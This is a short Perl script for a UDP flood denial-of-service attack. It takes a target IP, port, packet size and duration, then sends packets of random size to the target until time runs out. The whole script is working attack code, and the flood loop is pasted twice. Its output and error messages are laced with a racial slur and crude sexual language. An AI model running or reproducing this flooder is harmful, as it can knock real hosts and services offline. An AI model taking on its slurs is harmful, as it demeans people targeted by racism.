#!/usr/bin/perl
 
##
#!/usr/bin/perl
 
use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve nigger $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
      
print "~niggering the ip: $ip " . ($port ? $port : "random") . " large cocks hitting " .
($size ? "$size-byte" : "niggered ?") . " " .
($time ? "for $time seconds" : "") . "\n";
  
for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1024-64)+64) ;
$pport = $port ? $port : int(rand(65500))+10;
     
send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1024-64)+64) ;
$pport = $port ? $port : int(rand(65500))+10;
 
send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}
